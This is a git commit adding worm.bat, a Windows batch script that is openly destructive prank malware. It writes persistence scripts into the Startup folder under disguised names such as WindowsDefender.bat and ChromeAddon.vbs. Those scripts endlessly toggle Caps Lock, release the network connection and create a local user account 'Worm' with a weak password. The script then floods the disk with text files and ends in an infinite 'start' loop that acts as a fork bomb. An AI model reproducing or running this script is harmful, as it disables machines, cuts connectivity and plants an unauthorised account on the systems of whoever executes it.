40c85ef2567af88e659180395dae204df61eea39
victor olsson <business.nexenti@gmail.com>
2016-12-18 14:58:17 +0100

    Add files via upload

---
+++ worm.bat
@@ -0,0 +1,56 @@
+@echo off
+echo msgbox "WORM ACTIVATED" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\microupdate.vbs"
+echo msgbox "WORM HOPES YOU HAVE HAD A CYKA BLYAT DAY" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cykap32.vbs"
+
+echo ipconfig /release > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsDefender.bat"
+echo set WshShell = WScript.CreateObject("WScript.Shell"): Do: WshShell.SendKeys "{CAPSLOCK}": WScript.Sleep 500: Loop > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\plzdontdeleteworm.vbs"
+echo set WshShell = WScript.CreateObject("WScript.Shell"): Do: WshShell.SendKeys "{CAPSLOCK}": WScript.Sleep 500: Loop > "C:\Program Files\databasez.vbs"
+cscript "C:\Program Files\databasez.vbs"
+echo cscript "C:\Program Files\databasez.vbs" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ChromeAddon.vbs"
+echo dim speechobject :set speechobject=createobject("sapi.spvoice") :speechobject.speak "DUN DUN DUN DUN DUN DUN DUN" > "C:\Program Files\BritainsGotTalent.vbs"
+echo dim speechobject :set speechobject=createobject("sapi.spvoice") :speechobject.speak "Welcome to Infected Windows" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\BrowserPlugin.vbs"
+cscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsDefender.bat"
+echo NET Worm password123 > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\userrtime2x.bat"
+cscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\userrtime2x.bat"
+echo hello User that has been infected > worm.txt
+echo hello User that has been infected > worm1.txt
+echo hello User that has been infected > worm2.txt
+echo hello User that has been infected > worm3.txt
+echo hello User that has been infected > worm4.txt
+echo hello User that has been infected > worm5.txt
+echo hello User that has been infected > worm6.txt
+echo hello User that has been infected > worm7.txt
+echo hello User that has been infected > worm8.txt
+echo hello User that has been infected > worm9.txt
+echo hello User that has been infected > worm0.txt
+echo hello User that has been infected > worm10.txt
+echo hello User that has been infected > worm11.txt
+echo hello User that has been infected > worm12.txt
+echo hello User that has been infected > worm13.txt
+echo hello User that has been infected > worm41.txt
+echo hello User that has been infected > worm43.txt
+echo hello User that has been infected > worm352.txt
+echo hello User that has been infected > worm235.txt
+echo hello User that has been infected > worm2112.txt
+echo hello User that has been infected > worm44412.txt
+echo hello User that has been infected > worm6345454.txt
+echo hello User that has been infected > worm345435345435.txt
+echo hello User that has been infected > worm2132444444.txt
+echo hello User that has been infected > worm234343344444432.txt
+echo hello User that has been infected > worm11111111111111111111111111111111.txt
+echo hello User that has been infected > worm111111111111.txt
+echo hello User that has been infected > worm22222222222222222222222.txt
+echo hello User that has been infected > worm22222222222222.txt
+echo hello User that has been infected > worm2222222222222233.txt
+:KKK
+start
+start
+start
+start
+start
+start
+start
+start
+goto KKK
+
+
